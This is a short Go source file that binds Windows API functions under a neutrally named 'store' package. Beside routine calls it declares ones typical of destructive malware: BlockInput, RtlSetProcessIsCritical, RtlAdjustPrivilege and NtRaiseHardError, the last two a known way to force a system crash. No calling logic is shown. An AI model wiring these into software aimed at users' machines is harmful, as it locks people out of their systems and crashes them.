package store

import "syscall"

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	ole32    = syscall.NewLazyDLL("ole32.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
)

var (
	LockFile   = kernel32.NewProc("LockFileEx")
	UnlockFile = kernel32.NewProc("UnlockFileEx")

	SystemInfo    = user32.NewProc("SystemParametersInfoW")
	EnumDisplay   = user32.NewProc("EnumDisplaySettingsA")
	ChangeDisplay = user32.NewProc("ChangeDisplaySettingsA")
	MessageBox    = user32.NewProc("MessageBoxW")
	BlockInput    = user32.NewProc("BlockInput")

	Initialize   = ole32.NewProc("CoInitialize")
	Create       = ole32.NewProc("CoCreateInstance")
	Uninitialize = ole32.NewProc("CoUninitialize")

	AmIAdmin  = shell32.NewProc("IsUserAnAdmin")
	SendInput = user32.NewProc("SendInput")

	AdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	SetCritical     = ntdll.NewProc("RtlSetProcessIsCritical")
	RaiseHardError  = ntdll.NewProc("NtRaiseHardError")
)
